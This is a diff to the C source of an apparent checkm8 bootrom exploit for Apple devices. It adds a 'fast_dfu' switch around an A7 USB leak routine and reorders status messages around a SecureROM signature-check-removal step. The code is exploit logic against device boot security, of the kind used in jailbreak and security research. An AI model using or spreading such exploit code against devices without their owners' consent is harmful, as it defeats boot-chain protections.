@@ -14,6 +14,8 @@
 #include <overwrite.h>
 #include <common.h>
 
+extern int fast_dfu;
+
 // based on synackuk's belladonna
 // https://github.com/synackuk/belladonna/blob/824363bbc287da3cd2d97cba69aa746db89a86b6/src/exploits/checkm8/checkm8.c
 
@@ -28,7 +30,7 @@ int usb_req_leak(irecv_client_t client){
 
 int usb_req_leak_a7(irecv_client_t client){
     unsigned char buf[0x40];
-    irecv_async_usb_control_transfer_with_cancel(client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 100000);
+    irecv_async_usb_control_transfer_with_cancel(client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 100000); // fast dfu
     return IRECV_E_TIMEOUT;
 }
 
@@ -122,7 +124,7 @@ int checkm8_exploit(irecv_client_t client) {
     }
     usleep(100);
     for(int i = 0; i < config.large_leak; i++) {
-        if(cpid == 0x8960){
+        if(cpid == 0x8960 && fast_dfu){
             ret = usb_req_leak_a7(client);
         } else {
             ret = usb_req_leak(client);
@@ -267,7 +269,6 @@ int checkm8_exploit(irecv_client_t client) {
         printf("Device not in pwned DFU mode.\n");
         return -1;
     }
-    printf("\x1b[31;1mDevice is now in pwned DFU mode!\x1b[39;0m\n");
     
     if(cpid == 0x8960){
         // SecureROM Signature check remover by Linus Henze
@@ -348,12 +349,11 @@ int checkm8_exploit(irecv_client_t client) {
             return -1;
         }
         
-        printf("\x1b[36mDone\x1b[39m\n");
-        
         free(payload_writeSignature);
+        usleep(1000);
     }
     
-    
+    printf("\x1b[31;1mDevice is now in pwned DFU mode!\x1b[39;0m\n");
     irecv_close(client);
     return 0;
 }
